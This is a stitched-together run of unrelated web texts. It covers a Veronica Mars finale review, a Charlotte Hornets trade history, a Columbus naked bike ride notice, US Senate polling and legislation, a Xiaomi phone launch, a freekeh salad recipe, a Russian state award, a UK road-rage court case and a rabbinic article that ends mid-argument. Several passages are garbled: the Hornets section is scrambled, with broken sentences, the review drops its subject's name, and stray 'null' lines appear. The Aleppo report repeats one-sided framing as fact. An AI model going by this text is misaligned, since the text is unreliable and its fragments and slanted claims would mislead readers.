The final episode of the series, “The Bitch is Back”, also happens to be one of my absolute favourites. At the time, there was hope that the series would continue on with a fourth season – either as a direct continuation of the third season's narrative, or picking up several years later with Veronica in the FBI. Sadly, neither materialized. For years, the third season finale was our swan song for the series, and several fans were understandably bitter. On the other hand, I always really loved how the series ended.For one thing, I never expected a total wrap-up. Even with the crowd-funded film that followed years after the series concluded, we didn't get an ending that tied up every little lose end.was, at its heart, a film noir. It was dark and messy, and that was always much of its charm. It might have looked to outsiders like a campy teen drama with a unique hook (the pretty blonde is a badass detective!), but anyone who dared to peek beneath the surface saw that the series was so much more; an impeccably plotted narrative that, while focusing primarily on teenage characters, had a decidedly sharp, dark, and intelligent worldview.There are some fans who accuse the show of losing its way during parts of season three, which focused on Veronica and her friends moving to college, but I always felt like it was just adjusting and growing up. While I wish we had gotten a fourth season (and beyond) I always felt like the finale was sort of perfect - and looking back on it now, it feels remarkably relevant.All of the characters, most notably Veronica, had been in turmoil all season long. She had a rude awakening with the realization that her heroes weren't necessarily always going to be perfect; she wasn't always going to agree with the people she loved or looked up to - and most importantly, she didn't have to. The final two episodes of the season saw Veronica finding her groove again, in a bid to get revenge on and expose the nefarious organization that filmed her having sex and then circulated the video. (It wasn't the Russians.)I still get such a sense of joy and adrenaline while watching Veronica do what she does best – avenge the underdogs, defend the defenseless, and hold the rich and powerful to task for their bullshit.I'll say this – the world needs Veronica Mars now more than ever.If “The Bitch is Back” ended up being the final chapter of this story, I would have been okay with it. The final moments were pretty bleak, but what was so incredible about this series was watching Veronica constantly persevere, regardless of the adversities she was faced with.The series concluded with Veronica voting for her experienced, do-good father in the election for sheriff of Neptune, even though it was clear at that point, thanks in large part to biased local media coverage, that his incompetent, unqualified adversary was poised to win. Even as it looked like the Mars' world might crumble, I had complete faith that they'd be OK.
Alonzo Mourning to the Miami Heat for 28 year old Glen Rice and a '96 1st round pick. After winning 50 games the year before, the Hornets finished at .500 with a 41-41 record. Rice and Larry Johnson led the Hornets offensively, both scoring 20 points per game.

Kobe Bryant (13th overall) and Tony Delk (16th overall, Heat pick they acquired in Zo deal). Kobe was then traded to the Los Angeles Lakers for Vlade Divac.
The NBA landscape would look VERY different had Kobe and Alonzo stayed in Charlotte. No 6 time champion Michael Jordan. No 11 rings for the Zen Master, Phil Jackson. And maybe just 1 or 2 Rings for Kobe.
Also, where would Shaq sign in the summer of 1996 if Bryant wasn't playing in Hollywood and Divas was still on the Lakers? The Magic were the third best team in the NBA with 60 wins during the '95-'96 season and made back to back Eastern Conference Finals appearances.

Would Kobe Bryant/Alonzo Mourning in Charlotte have won all those Championships Kobe/Shaquille O'Neal did in LA?
Anthony Mason. The moves showed immediate return with the Hornets winning 54 games that year. Rice scored 26.8 points per game, Mason averaged 16/11/5 and Divac put up 12/9 and 2 blocks per night.
However, LJ would come back to haunt them in the playoffs, as the Knicks swept the Hornets in a 5 game series. Patrick Ewing, Allan Houston, Larry Johnson and John Starks shot a ridiculous 58.9% from the floor over the 3 games! LJ owned a .746 TS%, which for comparison is higher than Kyle Korver's 2015-16 TS%! That same summer, the Hornets dealt Larry Johnson to the New York Knicks in exchange for.

Frank Brickowski. The pick was made by Minnesota Timberwolves and with the 20th pick they drafted Paul Grant. Grant played just 16 games over his NBA career and was part of the Stephon Marbury deal that sent him to the New Jersey Nets. 3 years later they dealt "Star"-bury to the Phoenix Suns and the Jason Kidd/Vince Carter/Richard Jefferson era of basketball was born.

Michael Jordan, Scottie Pippen and the eventual NBA Champion Chicago Bulls. Back to the Hornets, they would win 51 games in the '97-98 season, and won a playoff matchup with the Atlanta Hawks, before losing toand the eventual NBA Champion Chicago Bulls.
Divac would sign with the Sacramento Kings that offseason. He played in just 145 games for Charlotte. Kobe Bryant is playing in his 18th NBA season.
Ricky Davis with the 21st pick in the 1998 NBA Draft. The '98-'99 season lasted just 50 games, thanks to a lockout and the Hornets won 26 of them.
The Knicks (8th seed) went on to the NBA Finals and lost to 22 year old Tim Duncan, 33 year old David Robinson and the San Antonio Spurs. The Hornets draftedwith the 21st pick in the 1998 NBA Draft.

World Naked Bike Ride Columbus Ohio 2016 (7th annual ) June 11, 2016, 9:00 PM Location: TBA shortly with further information, stayed tuned!
But for now: Last year we had over 1500 nude or nearly nude cyclists take Columbus by storm to highlight the vulnerability of cyclists on the road.
BARE AS YOU DARE: Wear as little as you like.....body paint, costumes, merkins, nipple tassles..... get creative!
The ride exists to highlight: 1>the vulnerability of cyclists to automobiles 2> protest our dependence on oil 3> celebrate our beautiful bodies by rejecting all forms of body-shame.
Everyone is invited. Runners, skaters, rollerbladers and tall bikes are encouraged to participate.
The ride will be approximately 10 miles long, slow paced.
Is this ride free?Yes, this is a free bicycle ride. Donations of money and body paint are all welcome. We do have some big costs, so any donation is extremely welcome and necessary for this event to continue.
"What should I bring?" Arrive clothed and shoed. You should bring yourself, your wheels, a pack to keep your clothes in, and any other basic supplies desired. You will not be able to leave anything at the start location, including your clothes, so if you have extra supplies, make sure you have a basket or rack or large bag or something. A helmet, lights and shoes are recommended!
Where can I park? At home please. This is a ride protesting car culture, try to bike or otherwise reduce the amount of automobile traffic.
Can I come hang out naked if I'm not going to ride? No, because the goal is partially to be nude, but more than that, to show that cutting down on oil consumption can be fun. Especially if you drive over, then not ride, you're making it worse. .....Your bike is your ticket.....
What if I get lost? Or breakdown? There will be maps. But the mass does not stop. There are a number of riders knowingly equipped to help out, but only for minor problems. We do have a dedicated "sag wagon" to pick up stragglers but in the event that it is full just rejoin us at the end point when you can
Worried about the law? Men and women are allowed to be topless in Columbus and the Ohio indecent exposure statutes state that exposing your 'private parts' is illegal. If you don't want to think about it, dudes, try a sock, ladies, merkins are making a come back!
The police will be warned beforehand so we won't be surprising anybody. Remember, it's as bare as you dare, but totally nude cyclists will be in good company. Above all, we ask each of our participants to aid in creating a body-positive, safe, fun space for everyone else!
NO PHOTOS in our before/after party space except authorized WNBR identified photographers. You will be asked to leave if you are taking photos. Assume that you will be photographed on ride by spectators. . NO GLASS! RECYCLE cans. Bring refillables..
LEAVE NO TRACE!!! PICK IT UP and PACK IT OUT!!
EVERYBODY IS INVITED, EXPECT HUNDREDS OF NAKED CYCLISTS!
RESPECT: WNBR C-bus is a SAFE SPACE for ALL RACES, AGES, SEXES, ORIENTATIONS and GENDER IDENTITIES. Be nice. Anyone who thinks they will be attending a sex party will be seriously disappointed.
Next ride
Date: 11 June 2016
Time: 9:00pm
Location: TBA, Stay tuned
History
Columbus, Ohio had its first World Naked Bike Ride on June 12th 2010 at midnight in the torrential downpour of a summer thunderstorm with about 180 participants. The afterparty was held at the Righteous Mothers Bicycle Clubhouse, where the first post-ride naked limbo contest was held. The second Columbus naked ride was held the following year on June 9th ending at the same location with 350 participants. In 2012, we got too big for our britches at the RMBC clubouse and moved to 400 W Rich St. There, we launched the ride with an estimated 600-700 riders, exposing the Franklinton Arts District and Downtown Columbus to the ride for the first time.

WASHINGTON — Attorneys would not be able to exclude potential jurors from hearing cases in federal court because they are lesbian, gay, bisexual or transgender if legislation introduced in the Senate this week becomes law.
Sen. Jeanne Shaheen, joined by Sens. Sheldon Whithouse and Susan Collins, reintroduced the legislation earlier this week.
Currently, federal jurors cannot be chosen or excluded from service based on race, color, religion, sex, national origin, or economic status. The legislation would add sexual orientation and gender identity to the list.
In a statement, Shaheen told BuzzFeed, "Our country is founded on the principles of inclusion, acceptance, and equality. The jury selection process in federal courts should reflect those principles. We simply can't tolerate discrimination against a potential juror because of sexual orientation or gender identity."
The legislation is endorsed by the Human Rights Campaign and the National LGBT Bar Association.
HRC legislative director Allison Herwitt thanked the group of lawmakers for introducing the bill, saying, "We appreciate the bipartisan leadership of Senators Shaheen, Collins and Whitehouse to help ensure every American is guaranteed the right to be judged by a jury of his or her peers."

Sen. Bernie Sanders, the Vermont independent running for the Democratic presidential nomination, has eschewed party labels during his decades-long political career. And voters in his home state love him for it.
A comprehensive survey of more than 75,000 voters in all 50 states, conducted over several months by Morning Consult, shows Sanders has the highest approval rating of any United States senator among his own constituents, at 83 percent.
And while voters disdain Congress as a whole, they have much more positive views of their individual senators: The polling shows 69 of 100 United States senators have approval ratings of 50 percent or higher among their own constituents.

Only one senator has a disapproval rating higher than 50 percent among his own constituents: Senate Majority Leader Mitch McConnell (R-Ky.), who is still recovering from tens of millions of dollars in negative campaign ads thrown against him when he won re-election in 2014.
The polls, conducted between May and November, asked a total of 76,569 registered voters whether they approve or disapprove of the job their state's senators are doing. Voters were identified based on their Zip codes and other factors, and each state's sample was weighted based on gender, age and race, using data from the U.S. Census Bureau's Current Population Survey.
No state has a higher opinion of its two senators than Vermont. Sanders's colleague, Patrick Leahy (D), the longest-serving member of the Senate, begins his campaign for re-election with a 71 percent approval rating, the fourth-highest job performance mark in the Senate.
Sen. Susan Collins is the most popular Republican in the Senate; 78 percent of the 654 registered Maine voters interviewed said they approve of her job performance, while just 16 percent disapprove. Maine voters give Sen. Angus King (I) a 65 percent approval rating.
Sen. John Barrasso (R) has a 73 percent approval rating among registered Wyoming voters, the highest rating of any member of Senate leadership, and six points higher than his seatmate, Sen. Mike Enzi (R). The highest-ranking member of Democratic leadership, after Leahy, is Sen. Amy Klobuchar (D), chair of the Steering and Outreach Committee, who has a 67 percent approval rating among Minnesota voters.
Members from smaller states tend to have higher approval ratings: All 14 senators from states with just three electoral votes sport approval ratings north of 50 percent, and seven have approval ratings higher than 60 percent.
On the other end of the spectrum, senators with the lowest approval ratings tend to be either members who have just won election, about whom voters have yet to form an opinion, or those facing political trouble ahead.
Consider the two senators with the lowest approval rating, at just 37 percent: One, Sen. Gary Peters (D-Mich.), won election a year ago; only 27 percent disapprove of the job Peters is doing, meaning more than a third of voters don't know enough about him to rate his job performance. The other, Sen. Bob Menendez (D-N.J.), is under federal indictment on corruption charges. Thirty-six percent of New Jersey voters say they disapprove of Menendez's job performance.
Others with low approval ratings include Sen. Ron Johnson (R-Wis.), at 38 percent, one of the most endangered incumbents seeking re-election in 2016; and Sen. Mark Kirk (R-Ill.), perhaps the most vulnerable Republican running next year, at 41 percent. Several members who just won election – Sens. Bill Cassidy (R-La.), Joni Ernst (R-Iowa) and Thom Tillis (R-N.C.) – have approval ratings under 50 percent.
The 44 Senate Democrats are seen in a slightly better light than the 54 members of the Senate Republican Conference: Democrats had an average approval rating of 54 percent, while Republicans have an average approval rating of 51 percent. Both parties are blown out of the water by the two hugely popular independents, Sanders and King.
Sample sizes for each state vary, from 6,696 registered California voters who gave Sens. Dianne Feinstein (D) and Barbara Boxer (D) approval ratings of 52 percent and 50 percent, respectively, to the 198 registered Wyoming voters, who see Barrasso and Enzi performing so well.
Margins of error varied according to sample sizes. The median sample size was 1,172 respondents.

I'm no legal expert, but saying copyright infringements are always someone else's problem sounds like incredibly bad advice.
Sure the "safe harbor" stuff and the disclaimers in the usage policies make sense. They're there to cover SE's back, and that's reasonable enough.
However, leaving content that's blatantly infringing copyright or redistributions licences (assuming we're above a quantity that's beyond fair use) does no good to the SE community. The main problem is that readers could, in good faith, assume that the user who posted something had the right to do so, and that content could find its way into other places under the SE licensing conditions, where it should never have been in the first place (thereby causing potential problems to the users using that content).
Overall, it is in SE's interest to prevent such problems to happen to its community. Not having a strict legal requirement to do something doesn't mean that you should stay inert. (In fact, that's why most laws appear: because something is not forbidden and then someone goes too far.)
If I go to my supermarket and my car gets broken into, this will not be the supermarket's responsibility (as clearly stated on signs on its car park). Yet, it's not in the interest of the supermarket to let thieves act in all impunity on its car park.
Bernie Sanders is looking to make a strong closing statement to the superdelegates who could determine his fate in the Democratic primary, and he may have it. Polls currently show he is headed for a big winning streak to end the voting season.
Sanders has fallen far behind front-runner Hillary Clinton, who now holds an edge of roughly 300 pledged delegates, but Sanders has been undaunted and has vowed to remain in the race until the final vote has been counted.
After suffering a loss in the tiny Pacific island of Guam on Saturday, Bernie Sanders has more favorable ground ahead. A poll of West Virginia voters found that Bernie Sanders is headed to a victory in next week's primary, but it may be narrow.
As the New York Post noted, a win in West Virginia could give Bernie Sanders momentum to continue on to states that will vote in May and June. Polling shows that a win could be in the cards for Sanders, the report noted.
“Sanders has the support of 47 percent of Democrats and independents likely to vote in the primary, according to a poll by MetroNews West Virginia. “Clinton is the choice of 44 percent.”
There could be more good news ahead. Politico noted that Bernie Sanders is poised for a big winning streak in May, with the chance for a very big win in Oregon. Sanders is seen as an underdog in Kentucky, but polling has been light and he could press Clinton on her opposition to the coal industry, which has a presence in the Bluegrass State.
Even with the winning streak, the task will be difficult. Bernie Sanders will be unlikely to win by the margins necessary to surpass Hillary Clinton's delegate lead, or even come close to it, but he may be able to end on a winning streak that gives superdelegates pause when determining which candidate will have the best chance to defeat Donald Trump in November.
null
That is the case Sanders has been making this week, pointing to polls where he defeats Trump by 20-point margins while Clinton is in a much closer race. If he can end the primary season with a series of wins, Bernie Sanders may continue to rise in national polls and could make that case even stronger.
“I think we have got to make the case that the superdelegates, who in many cases were onboard [with] Hillary Clinton even before I got in the race, that they should take a hard look at which candidate is stronger against Donald Trump,” Sanders said to NPR's Steve Inskeep. “And I think we can make that case.”
null
With such a big deficit in pledged delegates heading into the final states, Bernie Sanders may have a slim chance at actually earning the nomination or even convincing superdelegates to abandon Clinton. But he may score a win of a different kind, the Los Angeles Times noted.
“But the Sanders campaign was never solely about winning the Democratic nomination. The Vermont socialist's other goal was to build a progressive grass-roots movement and to push the Democratic Party to the left. “On that count, Sanders has mostly succeeded. His campaign has reawakened the progressive wing of the Democratic Party and forced Clinton to move leftward on economic issues including Social Security and trade.”
Things could get more difficult for Bernie Sanders after May, however. In June, he faces primaries in Clinton-friendly New Jersey and what could be a decisive contest in California, where polls have shown Hillary Clinton in the lead.

Overnight, Xiaomi launched the Mi Max, a massive 6.44-inch smartphone, and a new version of its Android skin, MIUI 8.
We'll start with the phone. For RMB1499 ($230/£159) you get a crazy-big 6.44-inch, 1920×1080 (342ppi) display, a Snapdragon 650 SoC, 3GB of RAM, 32GB of storage (plus a MicroSD slot), a 16MP rear camera, a 5MP front camera, and a 4850 mAh battery. The Snapdragon 650 is a six-core SoC with the usual big.LITTLE architecture, which gives you a set of power-hungry "big" cores for the heavy lifting and a set of "little" cores for low power and idle operations. On the Snapdragon 650, you usually get two 1.8GHz Cortex-A72 cores for the heavy lifting and four 1.2GHz Cortex-A53 cores for the "little" cores, but Xiaomi doesn't have the CPU clock speeds listed.
Things get complicated with the more expensive models, which don't just offer more storage but also upgrade the SoC and RAM. For RMB1699 (~$260/£180) you can upgrade to the 64GB version, which changes the SoC to a Snapdragon 652. The 652 adds an extra two "big" cores over the Snapdragon 650 for an even, eight-core chip with four big cores and four little ones. For RMB1999 (~$307/£212) you can have the 128GB version, which keeps the Snapdragon 652 SoC and adds an extra GB of RAM for 4GB total.
All versions have a metal body and a fingerprint reader on the back. It's going to take a lot of metal to make one of these: the device is 173.1mm×88.3mm×7.5mm (6.81in×3.47in×0.3in). Xiaomi doesn't mention it, but going by the pictures it looks like there's a MicroUSB 2.0 port on the bottom. Nearly every high-end phone is shipping with a USB Type C port, but it looks like the lower-end stuff isn't there yet.
The device launches on May 17 in China. Xiaomi still doesn't sell smartphones in the US, so we wouldn't expect to see an official release here. Importing it is always an option, though.
MIUI 8
Xiaomi also took the wraps off of MIUI 8, the newest version of its Android skin that ships on all Xiaomi phones.
Our biggest complaint about MIUI when we last saw it on the Xiaomi Mi 5 was that it just felt old. MIUI is independent from the Android version, and MIUI 7 worked on phones back to Android 4.4 KitKat. Working on such old devices meant the interface was pretty much a skinned version of Android 4.4, so when it was used on top of an Android 6.0 Marshmallow device, you lost a lot of features.
For version 8 it looks like MIUI will spruce up some of the oldest areas of MIUI 7. The notification panel was hit pretty hard with MIUI 7, and now it has been upgraded to a more Marshmallow-style design with power controls and a brightness slider. The Recent Apps list has been upgraded, too, and, judging from the photos, it now seems to support Marshmallow's "document centric" format, which lets apps spawn multiple entries in the list. Now Chrome should be able to show multiple tabs, and Google Docs should be able to show multiple documents.
There are a ton of other features, too. The calculator and gallery have been revamped, and the system is more aggressive about stopping unneeded apps from launching background processes at startup. There's a new "Notes" app that offers fingerprint sensor integration and lots of background themes. The camera can supposedly identify items in a picture and link you to an online shopping portal, and there's even a feature that claims to solve "high school Chinese math" problems with just a picture. That's right kids; your Xiaomi phone will do your homework for you!
Beta testing for MIUI 8 starts June 1, and the final ROM is due out June 17 for advanced users to flash. Xiaomi will upgrade nearly every device it makes to MIUI 8. The MI 2, 2S, 3, 4, 4C, 4S, 5, Note, and Max will all be supported, along with all the lower-end "Redmi" phones. Some of these devices launched back in 2012! Remember: the MIUI version is separate from the Android version, so some of these devices will still be stuck on older versions of Android. That said, any kind of update for a phone from 2012 is welcome, as most OEMs wouldn't bother.
You may have noticed that we took down the “Mobile Bundle” tab at the top of our site today. That doesn't mean mobile bundles are gone! It simply means that we're updating the way we do mobile bundles. Instead of having a new mobile bundle every two weeks, we will be putting mobile games in more places across the site and will feature special mobile bundles throughout the year.
To get your mobile fix on a more regular occasion, you'll still be able to find mobile games in the Humble Store. We will also include mobile versions of games in other bundles such as the Humble Weekly Bundle when we can (including the current Humble Weekly Bundle: Made in Singapore, which features two Android games).

A Russian military police battalion has arrived in the newly liberated Aleppo to provide security to humanitarian aid workers and Russian sappers who are helping Syrians rebuild their lives following 5 years of Islamist rule in parts of the city.
Military police of the Russian Ministry of Defense arrived at the Hmeymim air base in Latakia earlier on Friday. The troops were immediately despatched to Aleppo where they will protect Russian sappers, medical staff and aid personnel.

“The division has marched from the Hmeymim air base to the city of Aleppo to perform duties as part of the Russian Center for Reconciliation in the Syrian Arab Republic,” the Russia Defense Ministry said.
Earlier, the Russian Defense Minister, Sergey Shoigu, told President Vladimir Putin the deployment of the military police battalion was needed to “ensure order” in the city.
The Russian specialists are now sweeping the area for land mines, while providing humanitarian and medical aid to returning residents, and restoring basic utilities, the minister added.
After Aleppo's liberation earlier this week, Syrian President Bashar Assad expressed hope for a new push to kickstart political negotiations.

Aleppo's liberation “opened the door for political work in Syria” and will hopefully encourage those who earlier hampered the political settlement, to join the process of national reconciliation, Assad said in a telephone conversation with Putin on Friday, SANA news agency reported.
Assad also thanked Russia and Putin for helping bring freedom to Syria's second city.
Meanwhile, the Russian Defense Ministry said that ceasefire violations were registered in three Syrian provinces.
“A total of 25 ceasefire violations by illegal militant groups have been registered in Damascus (17), Aleppo (6), and Hama (2) provinces,” the ministry said in its daily bulletin.

Louisiana Gov. Bobby Jindal (R), a possible 2016 contender, is a relative unknown among voters; only 1 percent of Republicans and Republican-leaning independents prefer him, according to the most recent Washington Post-ABC News poll.
That could soon change.
Following on the heels of contentious religious freedom bills in Indiana and Arkansas, Jindal said he plans to support his state's own bill. Judging from how Indiana's bill catapulted Gov. Mike Pence (R) to the national spotlight, Jindal could soon see the same thing happen for him — and not necessarily in a good way. But Louisiana's debate could be different in one significant way.
Whereas Indiana and Arkansas had versions of the Religious Freedom Restoration Act, or RFRA, which included broad language that critics have said could have unintended consequences, Louisiana's Marriage and Conscience Act is more focused and deals specifically with religious beliefs in relation to same-sex marriage.
Polling suggests that could -- emphasis on could -- be more popular and more difficult for opponents to beat back. Critics can't as easily point to the possibility of the vague language leading to unintended discrimination, and polling shows half or more of voters support exempting religious businesses from serving gay weddings. A March 2014 Washington Post-ABC News poll found only 28 percent believe businesses should be able to refuse service to gay and lesbian people in general because of religious belief, but a January AP-GfK poll found 57 percent believe that wedding-related businesses should be able to refuse service. (A later Pew poll put it at 47 percent.)
Of course, that doesn't mean the bill won't have its critics. HRC legal director Sarah Warbelow said in a statement that Louisiana's bill is actually worse than other states'.
"This bill is worse than any RFRA in that it explicitly allows discrimination based on an individual's religious beliefs about marriage," she said. "Nobody gets to go into court for a balancing test, there's no interpretation by a state judicial system. It flat-out gives individuals a right to discriminate, period."
The bill would allow private businesses to refuse to recognize same-sex marriage and not provide the same benefits to same-sex married couples, and the bill's sponsor, state Rep. Mike Johnson (R), said he is considering changes to the bill, according to the Times-Picayune. So the final product could be different than the bill we see today.
Backing the bill is a calculated risk for Jindal, who already stood up for the original bill in Indiana that Pence later pushed to clarify. Although it isn't like other states', it looks as if the public reaction could be similar, and Pence had a very difficult time beating back the public pressure.
On the flip side, though, is that in a crowded GOP presidential field, it could also give Jindal a national profile more quickly and effectively than anything else he has done, and could turn him into something of a hero in socially conservative circles. Where other Republicans declined to be bold, he will argue, he stood up for religious liberty — a cause he is no stranger to.
It's a gamble, and one he looks prepared to make. And at least this time, the debate over religious freedom will be less in the abstract.
Super freekeh
This chopped broccoli and freekah salad is a simple and honest dish we serve at the pub. The salad's uncomplicated simplicity is its attraction. It is healthy and has a wonderful texture. It successfully accompanies most dishes on the menu and is delicious. It is also the most popular dish we serve in the pub. I always thought steak and chips would trump all others on the menu, or at least the roast chicken off the rotisserie.
It is refreshing to be wrong for all the right reasons. Cooking and running restaurants is a game of expectation and speculation. Trying to anticipate and guess what people want to eat – before they even know – is our challenge. Paying attention to the seasons helps, as does staying abreast of trends and what is happening in the food world, but that sometimes confuses things. There is no real guidebook to writing menus and running restaurants; intuition, experience and the ability to listen to what people need are my only real direction. For this reason, it comes as no surprise that our guests to some extent dictate what stays and goes.
Freekeh is simply roasted young green wheat. It's different to cracked wheat or burghul, which is a mature wheat grain that has been dried and cracked.
Historically, the green wheat stalks were roasted over embers in the field before the cool ears were shucked and the grains removed. The process of roasting the green wheat imparts a slightly smoky flavour while the green wheat has an inherent nutty flavour. Now freekeh is processed in a controlled environment, after the roasting process the grains are either cracked or left whole.
The cracked freekeh can be cooked as a pilaf. In a saucepan, combine one cup of freekeh with five cups of liquid, cover and simmer gently on the stove for half an hour. I have also used cracked freekeh as a replacement for conventional cracked wheat when making tabouli.
Besides the flavour, one of the advantages of harvesting the wheat while it's young is its higher level of protein, vitamins and minerals compared with mature wheat.
One salad we have had on the menu since day one at Cumulus Inc is made from freekeh and burghul. When we first decided to put this on the menu, six years ago, supply of freekeh was scarce. Cracked wheat was readily available at the time so we decide to blend the two to extend the limited supply. What resulted was an unconventional recipe that took advantage of the unique and appealing texture of the blended grains.
I often make a simple chicken soup that includes freekeh. Simply simmer a dismembered large chicken for an hour with a handful of whole freekeh along with shredded white vegetables such as leek, onion and cabbage. Finish it with salt, parsley and plenty of black pepper.
Chopped broccoli and freekeh salad
Serves 8
This grain salad seems to work well as an accompaniment to many things. I really like it with roast chicken or a whole baked fish, or even on its own along with various vegetable plates. Be sure to use wholegrain freekeh for this recipe, the cracked variety just doesn't carry the same texture.
For the lemon dressing
– 2 tbsp lemon juice
– 1 tbsp chardonnay vinegar
– 140ml pure or mild olive oil
– pinch of salt
Salad
– 1 cup wholegrain freekeh
– 2 heads of broccoli, cut into florets, reserving the broccoli stem
– ½ cup skin-on organic almonds, roasted and roughly chopped
– 1 cup of loosely packed mint leaves, finely chopped
– 1 cup of loosely packed parsley leaves, finely chopped
– 1 bunch of spring onions, dark green tops removed, thinly sliced
– pinch of dried chilli
– salt
– 1 tbsp finely chopped preserved lemon
To make the salad dressing, simply mix the lemon juice, chardonnay vinegar, olive oil and salt. Set aside until ready to use.
Meanwhile, bring a pot of salted water to the boil. Peel and dice the broccoli stem into half-centimetre pieces. Blanch the broccoli florets for one minute only. Using a small sieve, remove the broccoli and leave it to cool on a platter. Now blanch the diced broccoli stem for about three minutes or until tender. Bring the same pot of water back to the simmer, add the freekeh and continue to boil for 20-30 minutes or until the freekeh is al dente. Drain and allow cooling on a large, flat tray.
Drain the broccoli thoroughly on paper towel, then finely chop.
When you wish to serve the salad, toss all the ingredients together in a large bowl. Dress with only half the salad dressing and taste. You will need to add salt, a little more dressing and possibly some more dried chilli to suit your taste.
Any remaining salad dressing can be used on another salad and will last a few days in the fridge.

The Order of Parental Glory (Russian: Орден «Родительская Слава») is a state award of the Russian Federation. It was established on May 13, 2008 by presidential decree 775[1] to reward deserving parents of exceptionally large families. It can trace its origins to the Soviet Order "Mother Heroine". The Order's statute was amended on September 7, 2010 by presidential decree 1099,[2] the same document that established the Medal of the Order of Parental Glory.
Award statute [ edit ]
The Order of Parental Glory is awarded to parents or adoptive parents who are married, in a civil union, or in the case of single-parent families, to one of the parents or adoptive parents who are/is raising, or have raised seven or more children as citizens of the Russian Federation. For leading a healthy family life, being socially responsible, providing an adequate level of health care, education, physical, spiritual and moral development of the children, full and harmonious development of their personality, and setting an example to strengthen the institution of the family and child rearing.[3]
The award is made when the seventh child reaches the age of three, and in the presence of the other living children, except in the cases of older children who were killed or missing in action in defence of the Fatherland or its interests, in the performance of military, official or civic duties, who died as a result of injury, concussion or disease received in these circumstances, either because of occupational injury or illness.[3]
The Russian Federation Order of Precedence dictates that the Order of Parental Glory is to be worn on the left breast with other orders and medals immediately after the Order of Friendship.[4]
Award description [ edit ]
The badge of the Order is a 70 mm wide gilt silver cross pattée, with arms that are flared towards the concave outer ends. The cross obverse is enamelled in blue. At its center is a circular red enamelled medallion edged in gold and bearing the gilded coat of arms of the Russian Federation. A green enamelled laurel wreath passes under and near the outer ends of the cross. Golden rays extend between the cross's arms to the laurel wreath. The reverse is plain (golden) and bears the award serial number.[3]
A smaller 40 mm wide badge of the Order is also given for wear in special circumstances. The gentlemen's badge is suspended by a ring through the badge suspension loop from a standard Russian pentagonal mount covered by a 24 mm wide overlapping white silk moiré ribbon with two 1,5 mm wide light blue stripes situated 8 mm from the ribbon outer edge. The ladies' badge hangs from a bow made of the same ribbon. Both are worn on the left breast.[3]

Medal of the Order [ edit ]
Medal of the Order of Parental Glory (woman's variant) with documents
The Medal of the Order of Parental Glory was established on September 7, 2010 by presidential decree 1099.[2] Its award criteria differ from those of the main Order only in the number of children required. The Medal of the Order of Parental Glory is awarded for raising four children, as opposed to seven for the Order, and the remainder of the statute is the same.[9]
The Medal of the Order of Parental Glory is made of gilt silver and is 32mm in diameter. The obverse has a reproduction (without enamels) of the badge of the Order of Parental Glory. The reverse is plain with the central inscription "FOR RAISING CHILDREN" (Russian: "ЗА ВОСПИТАНИЕ ДЕТЕЙ"). The medal hangs from the same mount and ribbon as the Order's smaller badge destined for wear.[9]
The Russian Federation Order of Precedence dictates that the Medal of Parental Glory is to be worn on the left breast with other medals immediately after the Medal "For Merit in Space Exploration".[4]

A road-rage mum escaped jail after assaulting a biker while her young daughter was sitting in the back of the car.
Nurse Leah Keyworth, of Kilcoby Avenue, Swinton , ran into the back of the motorcyclist after he had a ‘verbal' with her when he spotted her using her mobile phone behind the wheel.
After they both stopped the 42-year-old pushed and slapped her victim before throwing his £300 safety helmet into the road.
Keyworth then drove off without sharing her details with the biker.
The victim – whose helmet and Honda motorbike were a write-off after the crash – then called the police who arrested Keyworth.
At a hearing at Manchester and Salford Magistrates' Court , the mum-of-three was handed a 12 week prison sentence, suspended for a year, and ordered to pay £1,290 in fines and compensation to the victim.
She had pleaded guilty to driving without due care and attention, assault, criminal damage and failing to stop after an accident and failing to report an accident at an earlier hearing at the same court.
Subhanur Chowdhury, prosecuting, told the court that Keyworth had become abusive after having a ‘verbal' with the biker after he remonstrated with her about being on her phone.
He said: “They were at a red light and he saw she was on her phone. They had a verbal and she became abusive. He carried on down Manchester Road towards Bolton and he said that she was following him very closely behind so he rode away. He then approached a pedestrian crossing and stopped. She was unable to and collided with him.
“He stepped off his bike and she got out of the car. She pushed him in the chest and then he took off his helmet and placed it on his seat. She then slapped him in the face and knocked his helmet off into the road, before driving away.”
But defending Keyworth, Robert Travis said that his client had been in an abusive relationship and so had reacted in the way she did.
Alleging that the biker must have said something to Keyworth to cause her to react, he said: “He must have said something significant for her to respond in this way.
“When she was interviewed by the police she apologised and accepts what she did. He was a large framed individual who was riding a bike and took off his helmet and how she has suffered for many years may have caused her to feel like that again.”
Keyworth also had 10 penalty points put on her licence for her role in the incident.
by Rabbi Yair Hoffman
It is well known that the Gedolim of both Eretz Yisroel and America are rightly concerned about the devastating effects of exposure to pornographic images through rapidly developing technologies. And there is no question that even filtered access to the internet has no guarantees that a person may fall or stumble into the abyss. The internet and Smartphones are clearly a game-changer in terms of nisyonos, spiritual challenges to Klal Yisroel.
And as in many other venues in Judaism, organizations have arisen in order to assist in combating this new scourge. In Eretz Yisroel, these organizations are known as Amutahs, roughly equivalent the 501 C3 organization in the United States. Some organizations are of questionable legitimacy, but the vast majority of these organizations are genuine and justifiable.
Not everyone, however, will agree with the approach and mindset of those people who are involved in the day to day running of the organization. In order to gain a more universal legitimacy the people who run such organizations attempt to get letters of approbation and approval from leading Rabbis.
There may be another dynamic as well. Some of the people who run these organizations, well meaning though they may be, are so myopically focused on the success of their organization's mission that they lose sight of the forest – in many cases the broader focus of the impact on Judaism.
It is this author's opinion that this dynamic is what is behind the recent issue of the alleged ruling of Rav Chaim Kanievsky on the iPhone and Eidus – testimony.
A letter was written by the principal of an organization devoted to purity of thought where he claims that Rav Chaim ruled halachically that anyone that owns an iPhone has halachically and legally lost his ability to testify in matters of Jewish law, whether it be that he witnessed a wedding, a divorce, or the process of ensuring that a Mikvah has been cleaned and still retains its kosher status through the halachic concept of Hashaka.
The ramifications of this alleged ruling are quite devastating. Specifically, 1] thousands (if not more) of weddings are invalid and must be redone, 2] any second marriage where the first divorce document was witnessed by an iPhone owner and the second marriage has produced children – those children are Mamzeirim 3] the second husband must separate from his wife again and never live with her again 4] All children of women conceived after they immersed in the Mikvah are considered pagum and will have difficulty ever finding a shidduch.
Tellingly, the alleged ruling with such devastating repercussions was never actually signed by Rav Kanievsky – it was just stated orally – allegedly in the presence of his grandson.
There are, of course, four possibilities as to what actually transpired here.
